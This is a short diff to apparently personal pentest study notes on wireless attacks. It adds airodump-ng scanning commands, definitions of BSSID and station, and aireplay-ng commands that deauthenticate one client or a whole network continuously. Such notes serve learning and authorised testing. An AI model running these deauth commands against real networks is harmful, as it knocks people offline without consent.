@@ -41,15 +41,25 @@ iwconfig wlan0 up
 airodump-ng wlan0 
 
 # for a specified network
-airodump-ng wlan0 --bssid [station MAC]
+airodump-ng wlan0 --bssid [MAC]
 
 ```
 {% endcode %}
+
+{% hint style="info" %}
+BSSID - MAC Address of an Access Point
+
+Station - MAC Address of a Client&#x20;
+{% endhint %}
 
 ## Deauth
 
 {% code lineNumbers="true" %}
 ```
 # on single client
+aireplay-ng --deauth 0 -a [bssid] -c [station] wlan0
+
+# on whole network
+aireplay-ng --deauth 0 -a [bssid] wlan0
 ```
 {% endcode %}
